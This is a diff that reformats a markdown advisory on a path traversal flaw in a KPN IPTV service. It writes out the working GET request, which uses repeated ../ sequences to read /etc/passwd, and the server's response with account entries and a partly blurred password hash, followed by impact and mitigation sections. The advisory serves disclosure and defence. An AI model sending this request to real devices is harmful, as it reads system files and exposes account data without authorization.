@@ -17,12 +17,13 @@ A **path traversal** (or directory traversal) attack occurs when an attacker man
 ### URL:
 ```plaintext
 http://192.168.2.x:8081/Service/Controller/UI?ip=192.168.2.x&port=8081
+```
 
-This is the base URL of the KPN IPTV service.
-Malicious Request:
+* This is the base URL of the KPN IPTV service.
 
-http
-
+# Malicious Request:
+* Burp request
+```
 GET /Service/Controller/UI../../../../../../../../../../../../../../../../etc/passwd?ip=192.168.2.x&port=8081 HTTP/1.1
 Host: 192.168.2.x:8081
 Cache-Control: max-age=0
@@ -32,14 +33,15 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 Connection: close
-
-In this request, the attacker exploits path traversal to reach the /etc/passwd file. This is done by adding multiple instances of ../, which moves up the directory structure.
+```
+* In this request, the attacker exploits path traversal to reach the /etc/passwd file. This is done by adding multiple instances of ../, which moves up the directory structure.
 Burp Suite Response
 
+# Response 
 The server responds with a 200 OK status and the contents of the /etc/passwd file, including sensitive information. The hashes in the response below have been blurred for privacy:
 
 plaintext
-
+```
 HTTP/1.1 200 OK
 Content-Type: unknown
 Content-Length: 940
@@ -64,10 +66,12 @@ gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
 nobody:*:65534:65534:nobody:/nonexistent:/bin/sh
 ntpd:x:1001:65534:Linux User,,,:/var/shared/empty:/bin/sh
 utc:$5$qkymr************$M1qu**************JoEifmNs********AiybaC:1000:1000:utc:/home/utc:/bin/sh
+```
 
-Explanation of /etc/passwd
 
-The /etc/passwd file stores essential user account information for a Unix-based system. It typically includes the following information:
+# Explanation of /etc/passwd
+
+* The /etc/passwd file stores essential user account information for a Unix-based system. It typically includes the following information:
 
     Username
     Password hash (if present)
@@ -78,16 +82,16 @@ The /etc/passwd file stores essential user account information for a Unix-based 
 
 While modern systems store password hashes in the /etc/shadow file, /etc/passwd can still leak important information, especially for attackers targeting system accounts.
 Impact
-
+```
     Information Disclosure: Attackers can access sensitive files like /etc/passwd, revealing system user information.
     Potential Exploitation: With access to password hashes, attackers can attempt password cracking or gain unauthorized system access.
-
+```
 Mitigation
-
+```
     Input Validation: Ensure all user inputs are validated and sanitized to prevent malicious sequences like ../.
     Restrict Directory Access: Configure the web server to limit access to sensitive directories.
     Use Web Application Firewalls (WAFs): A WAF can help detect and block suspicious URL patterns associated with path traversal attacks.
-
+```
 Conclusion
 
 Path traversal vulnerabilities can lead to severe data exposure and compromise system integrity. This example from the KPN IPTV service demonstrates how improper input validation can open the door to sensitive information leakage. Always implement strong security measures to mitigate such risks.
